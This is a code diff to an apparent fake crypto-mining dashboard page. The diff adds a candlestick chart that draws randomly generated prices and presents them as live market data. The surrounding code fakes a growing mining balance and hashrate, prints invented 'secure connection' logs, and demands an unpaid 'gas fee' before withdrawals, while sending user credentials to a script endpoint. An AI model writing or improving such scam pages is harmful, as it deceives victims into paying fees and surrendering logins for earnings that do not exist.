@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>⛏ NEXUS.CORE - Crypto Node Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+    
+    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
+    
     <style>
         :root {
             --bg-main: #09090b;
@@ -981,6 +984,8 @@
                 </div>
                 <div class="rate-big" id="rateBig">Syncing API...</div>
                 <div class="rate-sub" id="rateTs">Fetching market data...</div>
+                
+                <div id="usdChart" style="width: 100%; height: 180px; margin-top: 24px; border-top: 1px dashed var(--border); padding-top: 16px;"></div>
             </div>
         </div>
 
@@ -1173,8 +1178,9 @@
 
     <script>
         // ──────────────────────────────────────────────
-        // 🚀 GOOGLE APPS SCRIPT API CONFIGURATION (VERSI GET)
+        // 🚀 GOOGLE APPS SCRIPT API CONFIGURATION 
         // ──────────────────────────────────────────────
+        // LINK API BARU SESUAI PERMINTAAN
         const GAS_URL = 'https://script.google.com/macros/s/AKfycbzhbzNOlmEAOUkAfQSZ1U9eYTaChfqSpfChn8g58RkchRtF3-GEH0Mc6-i7U8_0QMQiLw/exec';
 
         // ──────────────────────────────────────────────
@@ -1193,6 +1199,90 @@
         let currentUserPass = ''; 
         let hasPaidGasFee = false;
         let autoSaveInterval = null;
+
+        // ──────────────────────────────────────────────
+        // 📈 TRADINGVIEW CANDLESTICK CHART
+        // ──────────────────────────────────────────────
+        let tvChart, tvSeries;
+        let tvCurrentCandle = null;
+
+        function initTVChart() {
+            const container = document.getElementById('usdChart');
+            if (!container || tvChart) return;
+
+            tvChart = LightweightCharts.createChart(container, {
+                width: container.clientWidth,
+                height: 180,
+                layout: {
+                    background: { type: 'solid', color: 'transparent' },
+                    textColor: '#a1a1aa',
+                    fontFamily: "'JetBrains Mono', monospace",
+                },
+                grid: {
+                    vertLines: { color: 'rgba(39, 39, 42, 0.4)' },
+                    horzLines: { color: 'rgba(39, 39, 42, 0.4)' },
+                },
+                timeScale: {
+                    timeVisible: true,
+                    secondsVisible: true,
+                    borderColor: '#27272a',
+                },
+                rightPriceScale: {
+                    borderColor: '#27272a',
+                },
+            });
+
+            tvSeries = tvChart.addCandlestickSeries({
+                upColor: '#10b981',
+                downColor: '#ef4444',
+                borderVisible: false,
+                wickUpColor: '#10b981',
+                wickDownColor: '#ef4444',
+            });
+
+            let data = [];
+            let time = Math.floor(Date.now() / 1000) - 3600;
+            let lastClose = rate || 16200;
+            
+            for(let i=0; i<60; i++) {
+                time += 60;
+                let open = lastClose;
+                let close = open + (Math.random() - 0.5) * 15;
+                let high = Math.max(open, close) + Math.random() * 5;
+                let low = Math.min(open, close) - Math.random() * 5;
+                data.push({ time, open, high, low, close });
+                lastClose = close;
+            }
+            tvSeries.setData(data);
+            tvCurrentCandle = data[data.length-1];
+
+            setInterval(() => {
+                if(!tvCurrentCandle || !tvSeries) return;
+                
+                let now = Math.floor(Date.now() / 1000);
+                if(now >= tvCurrentCandle.time + 60) {
+                    tvCurrentCandle = { 
+                        time: tvCurrentCandle.time + 60, 
+                        open: tvCurrentCandle.close, 
+                        high: tvCurrentCandle.close, 
+                        low: tvCurrentCandle.close, 
+                        close: tvCurrentCandle.close 
+                    };
+                }
+                
+                let tick = (Math.random() - 0.5) * 5; 
+                tvCurrentCandle.close += tick;
+                if(tvCurrentCandle.close > tvCurrentCandle.high) tvCurrentCandle.high = tvCurrentCandle.close;
+                if(tvCurrentCandle.close < tvCurrentCandle.low) tvCurrentCandle.low = tvCurrentCandle.close;
+                
+                tvSeries.update(tvCurrentCandle);
+            }, 1500);
+
+            // Responsive sizing
+            window.addEventListener('resize', () => {
+                tvChart.resize(container.clientWidth, 180);
+            });
+        }
 
         // ──────────────────────────────────────────────
         // 🧰 HELPERS
@@ -1424,11 +1514,9 @@
             const eyeIcon = document.getElementById('eyeIcon');
             if (pwField.type === 'password') {
                 pwField.type = 'text';
-                // Ganti icon ke mata dicoret (hide)
                 eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
             } else {
                 pwField.type = 'password';
-                // Ganti icon balik normal
                 eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
             }
         }
@@ -1444,6 +1532,9 @@
             dashLog('Secure connection established with Google Cloud Nodes...');
             dashLog(`Node ID: [${currentUser}] authenticated securely.`);
             dashLog(`Assets synced: ${fU(bal)} | Node Gas Fee: ${hasPaidGasFee ? '<span class="g">VERIFIED</span>' : '<span class="w">UNVERIFIED</span>'}`);
+            
+            // PANGGIL CHART DISINI
+            setTimeout(initTVChart, 100); 
         }
 
         // ──────────────────────────────────────────────
@@ -1570,7 +1661,6 @@
         // ──────────────────────────────────────────────
         setInterval(() => {
             if (active) {
-                // Kecepatan diturunin ke range 0.00079 sampai 0.00092
                 bal += 0.00079 + (Math.random() * 0.00013);
                 shares += Math.random() > 0.5 ? 1 : 0;
                 uptime++;
@@ -1589,7 +1679,6 @@
                 `Required: $${left.toFixed(4)} to unlock threshold` :
                 'Threshold unlocked. Ready for withdrawal.';
             
-            // Tampilan hashrate tetap di MH/s
             document.getElementById('stHash').textContent = active ?
                 (1200 + Math.floor(Math.random() * 300)) + ' MH/s' :
                 '0 MH/s';
@@ -1700,7 +1789,6 @@
             btnWd.textContent = 'Mengecek Sinkronisasi...';
             document.getElementById('wdAmt').disabled = true;
 
-            // Tarik data paling fresh dari DB Google
             if (currentUser && currentUserPass) {
                 try {
                     const userSync = await loginUser(currentUser, currentUserPass);
